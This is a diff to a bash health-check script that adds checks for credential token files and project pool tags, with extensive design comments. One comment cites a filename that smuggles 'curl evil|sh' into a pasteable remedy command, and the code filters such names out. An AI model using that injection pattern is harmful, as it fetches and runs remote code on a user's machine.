@@ -189,10 +189,13 @@ CCRC_DOCTOR_CHECKS=(
   disk
   wrappers
   accounts
+  credentials
+  pools
   graphify
   graphify-path
   build
   fleet
+  memory
 )
 
 # ── verdict helpers ───────────────────────────────────────────────────────
@@ -800,12 +803,12 @@ _dr_log_hint() {   # <unit> -> the command that shows its recent log
 }
 
 _check_services() {
-  local dir="$CCRC_UNIT_DIR" u st rc=0
+  local dir="$CCRC_UNIT_DIR" u st why rc=0
   local -a ok=() installed=()
   # Not a glob over the directory: `claude-session@*.service` lives there too
   # (every ccd session is one, CLAUDE.md) and those are long-lived by design and
   # none of doctor's business.
-  local -a known=(ccrc.service ccrc-agent.service ccd-cap-scopes.timer)
+  local -a known=(ccrc.service ccrc-agent.service ccd-cap-scopes.timer ccd-account-health.timer ccd-telemetry-keepalive.timer)
   # ON DISK BY THE PLATFORM'S NAME, reported by systemd's. `_dr_unit_file` is
   # the one translation; keeping `installed` in unit vocabulary is what lets
   # every message below read the same on both platforms. ccd-cap-scopes has no
@@ -853,10 +856,26 @@ _check_services() {
     fi
     case "$u" in
       *.timer)
-        # Unreachable on macOS today (`_inst_units` installs no cap-scopes
+        # ONE CLASS, TWO CONSEQUENCES. Both timers DEGRADE rather than down the
+        # box, so both warn — but the sentence an operator reads has to name
+        # what THIS one stopping costs, or they get the right remedy attached to
+        # somebody else's reason. `_dr_warn`'s detail is the only place that
+        # fact exists, so it is a case rather than one shared string.
+        #
+        # The `*` arm is not decoration: `known` above is the list this file
+        # maintains, and the day a fifth unit joins it, a timer with no sentence
+        # of its own says something true and vague rather than something
+        # confidently wrong about memory caps.
+        case "$u" in
+          ccd-cap-scopes.timer) why="panes spawned while it is stopped run without their memory cap" ;;
+          ccd-account-health.timer) why="no account's credential is being probed, so a lane whose sign-in has died goes on looking healthy to placement" ;;
+          ccd-telemetry-keepalive.timer) why="an idle account's ~/.cc-limits reading goes stale, so placement acts on a number nobody is refreshing" ;;
+          *) why="the job it fires is not running" ;;
+        esac
+        # Unreachable on macOS today (`_inst_units` installs neither timer's
         # plist there) — routed through the hint anyway, so the day that
         # changes the remedy is already right.
-        _dr_warn services "$u is installed but ${st:-not active} — panes spawned while it is stopped run without their memory cap" \
+        _dr_warn services "$u is installed but ${st:-not active} — $why" \
           "$(_dr_enable_now_hint "$u")"
         [ "$rc" -eq 1 ] || rc=2 ;;
       *)
@@ -2725,6 +2744,494 @@ _check_accounts() {
   return 2
 }
 
+# ── credentials: does every account this box will PROBE have a token file? ──
+# `ccd-account-health` derives each token's path by CONVENTION —
+# `$HOME/.cc-secrets/<id>-oauth.env` for every `telemetry: "anthropic"` account
+# — because `shared/roster.ts` permits `exec.secretsFile` only on
+# `kind: "generated"`, so the mandatory upstream account structurally cannot
+# declare where its credential lives. A roster-driven probe would have covered
+# the generated accounts and SILENTLY SKIPPED the primary one: precisely the
+# class of defect the health work exists to remove.
+#
+# A convention with no measurement is that silent skip waiting to happen. The
+# probe REFUSES an account whose token file is absent or empty — the fourth
+# outcome, and the correct one — but a refusal that only reaches a journal is
+# indistinguishable from a fleet where nothing went wrong. THIS is where absence
+# becomes loud.
+#
+# READ BY NODE, NOT JQ, for `_check_wrappers`' stated reason: this check must not
+# fail for a reason that belongs to another one, and a box with no jq already
+# gets exactly one FAIL, from the jq check.
+#
+# NOT ONE BYTE OF ANY FILE IS READ. `[ -s ]` answers existence and non-emptiness
+# together, which is the whole question — and this file's standing rule (see
+# `_check_config`) is that a credential is reported as SET or NOT SET and never
+# quoted at a terminal an operator pastes into a ticket.
+#
+# SKIP, NOT PASS, ON AN ABSENT OR UNREADABLE ROSTER: `_check_wrappers` above
+# already owns "this box has no roster", and two checks measuring one thing is
+# how they come to disagree. Skip on ZERO eligible accounts too — a scan over an
+# empty list passes everything, and a doctor reporting agreement nobody measured
+# is the worst failure this verb has.
+_check_credentials() {
+  local roster="$HOME/.ccrc/accounts.json"
+  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
+    _dr_skip credentials "no readable account roster at \$HOME/.ccrc/accounts.json — the 'wrappers' check above owns that"
+    return 3
+  fi
+  if ! command -v node >/dev/null 2>&1; then
+    _dr_fail credentials "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read" \
+      "install Node first — see the 'node' check above"
+    return 1
+  fi
+  local ids rc
+  ids="$(CCRC_DOCTOR_ROSTER="$roster" node -e '
+    const fs = require("fs");
+    let j;
+    try { j = JSON.parse(fs.readFileSync(process.env.CCRC_DOCTOR_ROSTER, "utf8")); }
+    catch (e) { process.exit(3); }
+    if (!j || typeof j !== "object" || !Array.isArray(j.accounts)) process.exit(4);
+    // Only ids that match the shared grammar reach stdout: an id outside it can
+    // name no file, and it must never be printed at a terminal that acts on
+    // control bytes (see `_check_wrappers`, which escapes for the same reason).
+    const ok = /^[a-z][a-z0-9-]{0,31}$/;
+    process.stdout.write(j.accounts
+      .filter((a) => a && typeof a === "object" && a.telemetry === "anthropic" && ok.test(a.id))
+      .map((a) => a.id).join("\n"));
+  ' 2>/dev/null)"; rc=$?
+  if [ "$rc" -ne 0 ]; then
+    _dr_skip credentials "\$HOME/.ccrc/accounts.json could not be read as a roster — the 'wrappers' check above owns that"
+    return 3
+  fi
+  if [ -z "$ids" ]; then
+    _dr_skip credentials "no account on this box declares telemetry \"anthropic\", so there is no Anthropic credential to look for"
+    return 3
+  fi
+  # SKIP, NOT FAIL, WHEN THE DIRECTORY ITSELF IS ABSENT: a box with a roster
+  # but no $HOME/.cc-secrets at all has not been PROVISIONED with credentials
+  # yet — a state the operator is legitimately in, most concretely right
+  # before the first `ccrc install` on a fresh box, or in an install fixture
+  # HOME that never creates the directory. `ccrc install` runs `cmd_doctor`
+  # and aborts on any FAIL, so failing this check here would block the very
+  # install that has to happen BEFORE provisioning can — an unmeasurable
+  # "not provisioned yet" is not the same finding as a measured "provisioned,
+  # and THIS account's file is missing", which stays a FAIL below.
+  if [ ! -d "$HOME/.cc-secrets" ]; then
+    _dr_skip credentials "no \$HOME/.cc-secrets directory — this box has not been provisioned with credentials yet; run again once \$HOME/.cc-secrets/<id>-oauth.env exists for each account declaring telemetry \"anthropic\""
+    return 3
+  fi
+  local id n=0 miss=0
+  local -a bad=()
+  for id in $ids; do
+    n=$((n + 1))
+    # THE CONVENTION, SPELLED ONCE IN THIS FILE — the second and last holder;
+    # `single-definition.test.ts` pins the pair and compares their shape.
+    [ -s "$HOME/.cc-secrets/$id-oauth.env" ] && continue
+    miss=$((miss + 1))
+    bad+=("$id has no readable token at \$HOME/.cc-secrets/$id-oauth.env")
+  done
+  if [ "$miss" -gt 0 ]; then
+    _dr_fail credentials "$(_dr_join "${bad[@]}")" \
+      "the account-health probe refuses an account with no token, so its liveness is never measured — put the account's CLAUDE_CODE_OAUTH_TOKEN in that file (0600), or set telemetry to \"none\" for an account this box does not authenticate to Anthropic"
+    return 1
+  fi
+  _dr_pass credentials "$n account(s) declaring telemetry \"anthropic\", each with a token file under \$HOME/.cc-secrets"
+}
+
+# ── the project pool tags (account pools, spec §5.4.6) ────────────────────
+# `$HOME/.cc-sessions/pools/<project>` is one file per tagged project, holding
+# one token. This check REPORTS and RESOLVES NOTHING — `_check_wrappers`'s own
+# contract — because every finding here is either an operator's intent to
+# revise or a permission bit no doctor should silently change.
+#
+# THE GRAMMAR IS SPELLED HERE, and that is D-92's trade rather than an
+# oversight: this file is sourced under `set -u` by things that are not `ccrc`
+# (`ccrc-doctor.test.ts`'s `tableNames()`), so a top-level reference to `ccd`'s
+# `POOL_NAME_RE` would make sourcing it FAIL, and a `${…:-…}` fallback is the
+# second spelling with a branch in front of it. `CCRC_RC_FILE` above makes the
+# identical trade. What is different from `ccrc-wrapper-shape`'s hand-copy of
+# `ID_RE` is that this one is PINNED: `server/test/pool-name-parity.test.ts`
+# extracts all three spellings — TypeScript, `ccd/ccd`, and this line — and
+# holds them byte-equal.
+POOL_NAME_RE='^[a-z][a-z0-9-]{0,31}$'
+# Builtin substitute for `grep -qxF`: exact-line membership, nothing more.
+# NOT "no fork ever" — `stat`, `date`, `df` and `readlink` are all forked
+# elsewhere in this file, so that claim would be false in one grep. What is
+# true of every one of THOSE forks is that each sits behind its own
+# `command -v` guard and DISCLOSES its own blindness when the binary is
+# absent ("df is not on PATH, so this check cannot measure free space",
+# "$sys is a SYMLINK (target unreadable)"). The dictated `cat`/`grep` version
+# here had no such guard: under `ccrc-doctor.test.ts`'s own harness (which
+# hands a check exactly the binaries it stubbed, nothing else — measured,
+# exit 127) it silently collapsed "no `cat` on PATH" into a REAL verdict
+# class, `pools-unreadable` — an adapter narrowing a distinction it received.
+# Keeping the fork would have needed the guard PLUS a seventh "could not
+# measure" class; a builtin read needs neither and leaves the doctor honest
+# on a broken box. It also buys back a correctness property for free:
+# `cat -- "$f"` may never block, and a FIFO under `pools/` would hang
+# `open(2)` forever — the `-f` gate below is what `_project_pool_state`
+# itself uses this same read for, and for the identical reason.
+_pool_has_line() {   # needle haystack -> 0 iff needle is one whole line of haystack
+  local needle="$1" hay="$2" line
+  while IFS= read -r line || [ -n "$line" ]; do
+    [ "$line" = "$needle" ] && return 0
+  done <<< "$hay"
+  return 1
+}
+_check_pools() {
+  # THE `pools` SEGMENT BELOW IS THE THIRD SPELLING of a name TypeScript holds
+  # as `POOLS_DIR_NAME` (`server/src/pools.ts`) and `ccd/ccd` as
+  # `POOLS_DIR="$REG/pools"`. It is spelled out rather than derived for the
+  # reason `POOL_NAME_RE` above gives — this file is sourced under `set -u` by
+  # things that are not `ccrc`, so it can reference no other tool's variable —
+  # and, like that one, it is PINNED: `pool-name-parity.test.ts` extracts every
+  # `.cc-sessions/<segment>` literal in this file, holds the one it finds equal
+  # to `POOLS_DIR_NAME`, and then RUNS this check against a tag planted at the
+  # directory that constant names. Renaming the directory in the two files that
+  # already had pins, and not here, is red twice over.
+  local dir="$HOME/.cc-sessions/pools" reg="$HOME/.cc-sessions" proot="$HOME/projects"
+  # SAME SHADOW AS THE READER, FOR THE SAME THREE DECISIONS (D-2520/D-2522).
+  # This check is the THIRD reader of the tag — it repeats `ccd`'s `-n 64` cap,
+  # its `[[:space:]]` strip and its `POOL_NAME_RE`, and it is pinned byte-equal
+  # to both other spellings. Byte-equal is not behaviour-equal while the locale
+  # is free, so a doctor run under one environment could pass a tag that the
+  # reader under another calls `malformed` — the check disagreeing with the
+  # thing it exists to check. Shadow it here too, or the parity this file
+  # asserts is textual only.
+  local LC_ALL=C
+  # `$REG` UNSEARCHABLE IS NOT `$REG` ABSENT, and the absence branch below
+  # cannot tell them apart — checked FIRST, ahead of it, because that branch
+  # is the one that answers. `-e "$dir"` and `-L "$dir"` are BOTH false when
+  # `$reg` itself is mode 000: neither predicate can stat OR lstat through a
+  # directory it may not search, so the pair D-1848 requires (which closes the
+  # dangling-symlink and loop shapes on `$dir` itself, and does close them)
+  # sails straight into the PASS. Measured before this guard: with `$reg` at
+  # mode 000 and a legal tag under it, this check printed `PASS pools: no
+  # project pools tagged (…/pools does not exist) — every project is
+  # unconstrained` while `_project_pool_state demo` answered `unreadable` and
+  # every placement decision on the box REFUSED. That is the reassuring-PASS
+  # inversion D-1848 was numbered for, one level up from where it looked.
+  #
+  # NOT THE READER'S WHOLE TEST, DELIBERATELY — and this is the one place this
+  # check may not mirror `_project_pool_state`. That reader answers
+  # `unreadable` for an ABSENT `$REG` too (`[[ -d "$REG" && -x "$REG" ]]`), on
+  # a branch its own comment calls unreachable, because `ccd` runs `mkdir -p
+  # "$REG"` at source time. `ccrc doctor` has no such guarantee: it runs on the
+  # SERVER box as well, which owns no `~/.cc-sessions` at all, and there
+  # "nothing is tagged, every project is unconstrained" is the truth rather
+  # than an unmeasured guess. So this refuses only what it can positively
+  # measure as PRESENT and unusable — a `$reg` that exists (or is a symlink
+  # that exists as one) and is not a searchable directory — and leaves genuine
+  # absence to the branch below. Both halves are pinned: `ccrc-doctor.test.ts`
+  # has a mode-000-`$reg` case that must FAIL and a no-`$reg` case that must
+  # PASS.
+  if { [ -e "$reg" ] || [ -L "$reg" ]; } && { [ ! -d "$reg" ] || [ ! -x "$reg" ]; }; then
+    _dr_fail pools "pools-unlistable: $reg is not a searchable directory, so nothing under it — $dir included — can be reached, and ccd answers unreadable for EVERY project on a box shaped like this" \
+      "fix what is at that path — check with: ls -ld $reg"
+    return 1
+  fi
+  # `-e` alone is FALSE for a DANGLING symlink — the same defect this wave has
+  # already fixed twice in `ccd/ccd` (its reader, `_project_pool_state`, and
+  # its writer verb): "not `-e`" reads as absence when it is not. A
+  # half-finished `ln -s` after moving the registry must not print this box's
+  # most reassuring PASS while `ccd` answers `unreadable` for EVERY project —
+  # so a dangling (or looping) `$dir` falls through to the unlistable check
+  # below instead of returning here.
+  if [ ! -e "$dir" ] && [ ! -L "$dir" ]; then
+    _dr_pass pools "no project pools tagged ($dir does not exist) — every project is unconstrained, which is the pre-pools behaviour"
+    return 0
+  fi
+  # TWO CONDITIONS, NOT ONE (D-1851) — split in fix round 7, because the single test
+  # that stood here FAILED on a box where `ccd` works perfectly. `-r` and `-x`
+  # on a directory are different permissions answering different questions:
+  # SEARCH (`-x`) is all `_project_pool_state` needs, because it stats one
+  # known path (`$POOLS_DIR/<project>`) and never enumerates; LIST (`-r`) is
+  # what THIS check needs and the reader never does. A `pools/` at mode `--x`
+  # therefore has every tag readable by the authority and no tag visible to
+  # the doctor — and the old test called that `pools-unlistable: … so no
+  # project's tag can be read — ccd reads this same path`, which is false in
+  # both halves. A doctor that FAILs a healthy box is the cross-file
+  # disagreement class this wave keeps finding, pointed at itself.
+  #
+  # A regular file, a dangling symlink, or a directory nobody may search: ccd
+  # cannot reach a tag either, and answers `unreadable` for every project.
+  if [ ! -d "$dir" ] || [ ! -x "$dir" ]; then
+    _dr_fail pools "pools-unlistable: $dir is not a searchable directory, so no project's tag can be read — ccd reads this same path and answers unreadable for every project" \
+      "fix what is at that path — check with: ls -ld $dir"
+    return 1
+  fi
+  # Searchable but not listable: placement is UNAFFECTED and this check is
+  # blind. WARN, and say which of the two it is — a separate class from
+  # `pools-unlistable` because the remedy is the same command but the CLAIM is
+  # the opposite one ("nothing works" vs "everything works, nobody can audit
+  # it"), and `_dr_warn`/`_dr_fail` are not interchangeable printers.
+  if [ ! -r "$dir" ]; then
+    _dr_warn pools "pools-unenumerable: $dir cannot be listed, so this check can audit no tag — but it is searchable, so ccd reads every tag it is given a project name for and placement is unaffected" \
+      "make it listable if you want this check to see it — ls -ld $dir"
+    return 2
+  fi
+
+  # ONE BUCKET PER REMEDY, this file's standing rule: two conditions cured by
+  # the same command share a verdict line; a condition with a DIFFERENT cure
+  # gets its own line and its own remedy. Five buckets, five different cures.
+  local p_leak=() p_unread=() p_malformed=() p_stale=() p_orphan=()
+  # The pool vocabulary the FLEET obeys — `~/.ccrc/accounts.sh`, the generated
+  # projection, not `accounts.json`. Sourced in a SUBSHELL so nothing it
+  # defines lands in doctor's namespace. When it cannot be read the orphan arm
+  # makes NO CLAIM (an empty `known`): `_check_wrappers` already FAILs loudly
+  # for a missing or unreadable roster with its own remedy, and inventing a
+  # second verdict for the same condition would hand one fact two vocabularies.
+  # THREE STATES, NOT TWO, AND `known` CAN ONLY CARRY TWO. An empty `known`
+  # means "the read failed" OR "the read succeeded and no account is tagged" —
+  # and the SECOND is every box on this fleet until someone tags the first
+  # account. Reading emptiness as failure is the overloaded-null rule (this
+  # wave's own rule) inverted: D-1744 folded `unreadable` into a benign state,
+  # and the first version of the PASS below folded a benign state into
+  # `unreadable`, telling every operator that a file it had just read fine
+  # could not be read. `[ -r … ]` above already ESTABLISHED that it was
+  # readable and the old code then threw that away and re-inferred it from an
+  # empty result. So the outcome is carried separately from the content: a
+  # sentinel first line, printed only when the source and the `declare -F`
+  # both succeeded, is what says MEASURED. Nothing else can — an empty
+  # vocabulary and a failed read produce the same empty string by
+  # construction. `|| :` inside the loop is KEPT — it costs nothing — but it
+  # is not what stands between an ordinary untagged account and a false
+  # `unmeasured` against the file this fleet actually runs. Measured on bash
+  # 5.2.21, a `case` that matches no arm returns rc 0, and an empty
+  # `case … esac` — the exact shape `shared/generate.mjs` emits for
+  # `_ccrc_pool` unconditionally, and documents in its own comment ("An
+  # empty `case … esac` is valid bash and answers empty at rc 0, which is
+  # exactly the contract") — returns 0 too. So `_ccrc_pool` cannot fail on
+  # an untagged or unknown id against a GENERATED `accounts.sh`, which is
+  # this file's only writer, and the `measured` sentinel above already
+  # carries the third state on its own, unconditionally. What the `|| :`
+  # nets is an OUT-OF-CONTRACT `_ccrc_pool` — one whose body does not honour
+  # the generator's own "case ends 0" promise — not a shape anyone has
+  # measured to exist on this fleet: nothing writes `accounts.sh` but
+  # `shared/generate.mjs`.
+  local known="" vocab=unmeasured raw=""
+  if [ -r "$HOME/.ccrc/accounts.sh" ]; then
+    raw="$( . "$HOME/.ccrc/accounts.sh" 2>/dev/null \
+      && declare -F _ccrc_pool >/dev/null 2>&1 \
+      && { printf 'measured\n'; for a in "${CCRC_ACCOUNTS[@]}"; do _ccrc_pool "$a" || :; done; } )" || raw=""
+    if [ "${raw%%$'\n'*}" = measured ]; then
+      vocab=measured
+      known="${raw#measured}"; known="${known#$'\n'}"
+    fi
+  fi
+
+  # This box's `*.project` registry rows, read ONCE rather than once per tag —
+  # matching `known` above, and for the same reason. Builtin-read (`$(< "$rf")`,
+  # not `cat`; see `_pool_has_line`'s own header for why neither this file nor
+  # any check in it may fork a coreutil).
+  local reg_rows="" rf
+  for rf in "$reg"/*.project; do
+    [ -e "$rf" ] && [ -f "$rf" ] && [ -r "$rf" ] || continue
+    reg_rows+="$(< "$rf")"$'\n'
+  done
+
+  local n f v
+  # `*` ALONE never matches a dot-leading name (bash's default, no `dotglob`),
+  # so the tmp-leak bucket below would be permanently empty without the two
+  # extra patterns — `.[!.]*` and `..?*` are the standard dotglob-free way to
+  # add "every dot-leading name except `.` and `..`" (measured: the bare `*`
+  # form silently never saw a `.demo.4242.tmp` fixture at all).
+  for f in "$dir"/* "$dir"/.[!.]* "$dir"/..?*; do
+    # `-e` alone would drop a DANGLING symlink here — an unmatched glob and a
+    # real-but-broken tag are not the same thing, and only the glob case may
+    # be skipped silently. `-L` catches it; the `-f`/`-r` bucket below then
+    # answers it `pools-unreadable` on its own, exactly like any other tag
+    # that exists and cannot be read.
+    [ -e "$f" ] || [ -L "$f" ] || continue   # unmatched glob: no nullglob here
+    n="${f##*/}"
+    case "$n" in
+      .*) p_leak+=("$n"); continue ;;
+    esac
+    # UNREADABLE and MALFORMED below mirror `_project_pool_state`'s own
+    # PER-TAG arms — its `-f`/`-r` type-and-permission gate, its NUL test, its
+    # trailing-whitespace strip and its grammar check, in that order, reaching
+    # the same word for the same bytes. A doctor that measured a WELL-FORMED
+    # tag differently from the file that obeys it would report on a rule
+    # nobody enforces.
+    #
+    # "PER-TAG" IS THE WHOLE OF THE CLAIM, and it is narrower than the
+    # sentence that stood here until this fix round, which said the arms
+    # mirrored the reader's "exactly" and was falsified twice over. The
+    # DIRECTORY-level arms deliberately differ: an unreadable `$reg` or `$dir`
+    # is `pools-unlistable` here and `unreadable` there, and an ABSENT `$reg`
+    # is a PASS here and `unreadable` there (see the guard at the top of this
+    # function for why). And until this round the NUL arm did not mirror
+    # anything at all — see below. That mapping also stops at the three arms
+    # named: `untagged` has no bucket here (an untagged project has no file
+    # for this loop to see at all), and STALE/ORPHAN/TMP-LEAK below have no
+    # counterpart in `_project_pool_state` — they answer "should this tag
+    # exist", not "what does this tag mean", and only the doctor asks that
+    # question.
+    #
+    # `-f`/`-r` are checked FIRST and SEPARATELY from the read, exactly as the
+    # reader checks them and for its two reasons: `-f` is a TYPE gate that
+    # must precede any attempt to OPEN `$f` (a FIFO under `pools/` blocks in
+    # `open(2)` forever, and `read < "$f"` blocks there no less than `cat`
+    # would), and `-r` settles the permission question BEFORE the read, so a
+    # mode-000 tag is answered `pools-unreadable` rather than falling through
+    # to a read that finds no delimiter and looks exactly like empty content.
+    #
+    # THE READ IS `read -r -d ''`, NOT `$(< "$f")` — fix round 6. Bash DROPS a
+    # NUL byte wherever it lands in a variable, so once the bytes are inside
+    # `$v` the NUL is gone and no later test can find it: `printf 'pool-\0a'`
+    # spliced to the legal-looking token `pool-a`, this check PASSED "every
+    # project tag … is one legal pool name" while `_project_pool_state`
+    # answered `malformed`, and the command substitution ALSO printed
+    # `warning: command substitution: ignored null byte in input` straight to
+    # the operator's stderr — from the PARENT SHELL, so no redirection on the
+    # read could have caught it (all measured). The only builtin that can SEE
+    # a NUL is `read -d ''`, whose exit status is 0 iff the read stopped short
+    # of EOF and 1 at EOF — a free detector, and the one the reader
+    # already uses. Using it removes the command substitution, so both halves
+    # of the defect close in one change, and it stays fork-free (this file's
+    # PATH is not guaranteed to carry `cat` — measured under
+    # `ccrc-doctor.test.ts`'s harness, exit 127; see `_pool_has_line`'s
+    # header).
+    #
+    # THE REDIRECTION ORDER IS THE READER'S, and load-bearing for the same
+    # reason it states there: bash applies redirections LEFT TO RIGHT and
+    # reports a failing one on whatever stderr is current AT THAT POINT, so
+    # `2>/dev/null` must come BEFORE `< "$f"` or a permission error escapes
+    # before the silencer is in place. (`-r` above means that only matters for
+    # a TOCTOU race, and getting it right costs nothing.)
+    #
+    # DISCLOSED, NOT CLOSED, exactly as the reader discloses it: `read -d ''`
+    # returns 1 for a read FAILURE and for EOF alike, so a failure past
+    # `-f && -r` reads as ordinary content. A zero-byte result lands in
+    # `p_malformed`; a partial read leaving a legal prefix is reported as a
+    # well-formed tag this file never held. Both are the reader's parked arms,
+    # inherited here rather than re-argued, because a doctor that measured
+    # them differently would be the second reader of one fact this comment
+    # exists to prevent.
+    if [ ! -f "$f" ] || [ ! -r "$f" ]; then
+      p_unread+=("$n"); continue
+    fi
+    # `-n 64` IS THE READER'S SIZE GATE (D-1850), inherited here for the reason every
+    # other arm in this loop is: a doctor that read a tag differently from the
+    # file that obeys it would report on a rule nobody enforces. Twice the
+    # 32-character grammar, so no legal tag reaches it; an over-cap file stops
+    # short of EOF, returns 0 from this same branch, and is answered
+    # `pools-malformed` — which is what the reader answers too. Without it a
+    # `pools/<p>` symlinked at a growing log is read whole into a variable by
+    # the one tool an operator runs when the box is already sick.
+    v=
+    if { IFS= read -r -d '' -n 64 v; } 2>/dev/null < "$f"; then
+      p_malformed+=("$n"); continue
+    fi
+    v="${v%"${v##*[![:space:]]}"}"
+    if ! [[ "$v" =~ $POOL_NAME_RE ]]; then
+      p_malformed+=("$n"); continue
+    fi
+    # STALE is about the PROJECT, not the pool: a directory under the projects
+    # root, or a registry row naming it — the same two-way test the verb's
+    # `--pool` arm applies, so a custom-workdir project is never called stale.
+    if [ ! -d "$proot/$n" ] && ! _pool_has_line "$n" "$reg_rows"; then
+      p_stale+=("$n")
+    fi
+    # ORPHAN is about the POOL: no TAGGED account carries the name, so no
+    # account is in it BY TAG. WARN, not FAIL — the pool may be about to gain
+    # an account (O5).
+    #
+    # WHETHER A SESSION OF SUCH A PROJECT STRANDS IS NOT DECIDED HERE. This
+    # comment said "will strand rather than cross (ruling 6)" and then, for one
+    # round, said it strands "only when neither exists" — both wrong, the second
+    # because existence is not availability (D-1959, D-1972). The rule has ONE
+    # home: spec §5.7.3. Do not restate it here.
+    if [ -n "$known" ] && ! _pool_has_line "$v" "$known"; then
+      p_orphan+=("$n ($v)")
+    fi
+  done
+
+  local rc=0
+  if [ "${#p_unread[@]}" -gt 0 ]; then
+    _dr_fail pools "pools-unreadable: $(_dr_join ${p_unread[@]+"${p_unread[@]}"}) — the tag exists and cannot be read, so ccd refuses to place work for these projects rather than treating them as unconstrained" \
+      "fix the mode/ownership under $dir — check with: ls -l $dir"
+    rc=1
+  fi
+  if [ "${#p_malformed[@]}" -gt 0 ]; then
+    _dr_fail pools "pools-malformed: $(_dr_join ${p_malformed[@]+"${p_malformed[@]}"}) — the file holds something that is not one pool name, so nothing can decide these projects' placement" \
+      "rewrite each as a single lowercase token: ccd project-pool --project <p> --pool <name>"
+    rc=1
+  fi
+  if [ "${#p_stale[@]}" -gt 0 ]; then
+    # One `ccd project-pool --project <n> --clear` per stale name, not a single
+    # templated sentence — the remedy is the exact command an operator runs,
+    # and a `<p>` placeholder left unsubstituted is not a command at all.
+    # AND THE NAME IS FILESYSTEM-DERIVED (D-1852), so it is filtered before it lands
+    # inside a command an operator is invited to paste. Not an escalation —
+    # writing under `$dir` already requires code execution as this user — but
+    # this check's whole value is that what it prints can be trusted, and a
+    # tag file named `x; curl evil|sh` rendered `remedy: clear each: ccd
+    # project-pool --project x; curl evil|sh --clear`. The charset is
+    # `_ws_project_valid`'s own (`ccd:3685`, `^[A-Za-z0-9._-]+$`, no
+    # dot-leading), so no name `ccd` would ever CREATE is omitted — a
+    # cross-file claim, and `pool-name-parity.test.ts` measures it rather than
+    # trusting this sentence. A leading `-` is refused too: it is shell-safe
+    # but would be read by `ccd` as a flag, not as the project.
+    # The MESSAGE above is a different surface and is not filtered: it is
+    # printed, never executed, and `_dr_line` already squashes the newline
+    # that is the only way to forge a second verdict line.
+    local -a p_stale_cmds=(); local p_stale_omit=0
+    for n in "${p_stale[@]}"; do
+      case "$n" in
+        ''|.*|-*|*[!A-Za-z0-9._-]*) p_stale_omit=$((p_stale_omit + 1)); continue ;;
+      esac
+      p_stale_cmds+=("ccd project-pool --project $n --clear")
+    done
+    local p_stale_remedy=""
+    if [ "${#p_stale_cmds[@]}" -gt 0 ]; then
+      p_stale_remedy="clear each: $(_dr_join "${p_stale_cmds[@]}")"
+    fi
+    if [ "$p_stale_omit" -gt 0 ]; then
+      [ -z "$p_stale_remedy" ] || p_stale_remedy+=" — and "
+      p_stale_remedy+="$p_stale_omit name(s) are NOT printed as a command: they are not shaped like a project name (a character outside A-Za-z0-9._- , or a leading dot or dash), so the command would not mean what it looks like. Remove those by hand under $dir"
+    fi
+    _dr_warn pools "pools-stale: $(_dr_join ${p_stale[@]+"${p_stale[@]}"}) — tagged, but no project directory and no registry row of that name exists, so nothing reads these tags" \
+      "$p_stale_remedy"
+    [ "$rc" -eq 1 ] || rc=2
+  fi
+  if [ "${#p_orphan[@]}" -gt 0 ]; then
+    _dr_warn pools "pools-orphan-pool: $(_dr_join ${p_orphan[@]+"${p_orphan[@]}"}) — no account in this box's roster is TAGGED into that pool. A hard-blocked session of these projects strands rather than crossing unless some untagged account is AVAILABLE to take it — installed, not kill-switched, and under the swap ceiling" \
+      "either tag an account into the pool in \$HOME/.ccrc/accounts.json and redeploy the agent lane, or retag the project: ccd project-pool --project <p> --pool <name>"
+    [ "$rc" -eq 1 ] || rc=2
+  fi
+  if [ "${#p_leak[@]}" -gt 0 ]; then
+    _dr_warn pools "pools-tmp-leak: $(_dr_join ${p_leak[@]+"${p_leak[@]}"}) — a dot-leading entry, i.e. a tmp file a SIGKILL left between the write and the rename; inert, and no reader sees it" \
+      "rm the named entries under $dir"
+    [ "$rc" -eq 1 ] || rc=2
+  fi
+  if [ "$rc" -ne 0 ]; then return "$rc"; fi
+  # THE PASS SENTENCE SAYS ONLY WHAT RAN (D-1853). `known` empty means the roster
+  # projection could not be read, the orphan arm above made NO claim, and the
+  # old single sentence asserted the third clause ("names a pool this box's
+  # roster carries") anyway — a PASS reporting a check that was skipped, which
+  # is the same false-PASS shape D-1848's own doctor instance was numbered for.
+  # AND THE FIRST FIX POINTED SOMEWHERE FALSE, caught by the same round's
+  # verification: it said `_check_wrappers` reports the unreadable projection
+  # on its own line. Measured — `_check_wrappers` (:2189-2680) contains ZERO
+  # occurrences of `accounts.sh`; it reads `accounts.json`, and on a box with
+  # the JSON and no projection it answers PASS. `_check_graphify` sources the
+  # projection when it can and silently SKIPS when it cannot, emitting no
+  # verdict. So nothing in this file reports that file, and this sentence now
+  # says so rather than sending an operator to read a line that is not there.
+  # (On a FLEET box the real finding is louder anyway: `ccd` dies at source
+  # time without it, at its own `no account roster at` guard. This also runs
+  # on the server box, where absence is ordinary, so the verdict stays a PASS
+  # and states its own limit.)
+  if [ "$vocab" = measured ] && [ -n "$known" ]; then
+    _dr_pass pools "every project tag under $dir is one legal pool name, names a project that exists, and names a pool this box's roster carries"
+  elif [ "$vocab" = measured ]; then
+    _dr_pass pools "every project tag under $dir is one legal pool name and names a project that exists — and this box's roster carries NO pools at all: the vocabulary was read and is empty, so the orphan arm had nothing to match against and made no claim"
+  else
+    _dr_pass pools "every project tag under $dir is one legal pool name and names a project that exists — the pool-vocabulary half is UNMEASURED: \$HOME/.ccrc/accounts.sh could not be read, and no other check here reports that file (_check_wrappers reads accounts.json, not the projection)"
+  fi
+}
+
 # ── graphify: the AST-graph sweep's engine, skills, excludes, census, and
 # worktrees headroom (D-995, D-997) ────────────────────────────────────────
 # `~/.ccrc/graph-sweep.json` is a census FOR an operator, not a doctor of its
@@ -2783,6 +3290,23 @@ _check_graphify() {
   # absorbs — measured against a bare, no-newline stamp).
   if [ -r "$pin_file" ]; then IFS= read -r pin < "$pin_file" || true; fi
   pin="$(_dr_trim "$pin")"
+
+  # ── the search gate's state (R5, D-1613) ────────────────────────────────
+  # NOT a bucket and NOT a finding: the gate is armed by default and its
+  # kill-switch is an operator switch deliberately set, which this fleet
+  # reports rather than warns about (`$REG/coordinator-paused` reaches the
+  # wire, not a doctor line). But nothing else on the box reports it at all —
+  # the file has no writer in the tree and no verb prints it — so it rides
+  # every verdict line this check prints, PASS and WARN and FAIL alike: which
+  # class the rest of the measurement lands in must not decide whether the
+  # operator can see whether sessions are being gated.
+  # The path is `ccd/session-hook.sh`'s `GRAPH_GATE_OFF`, whose hook is the
+  # only reader; `ccrc-doctor-graphify.test.ts` HARVESTS it from there and
+  # plants its fixture at whatever the hook now says, so the two spellings
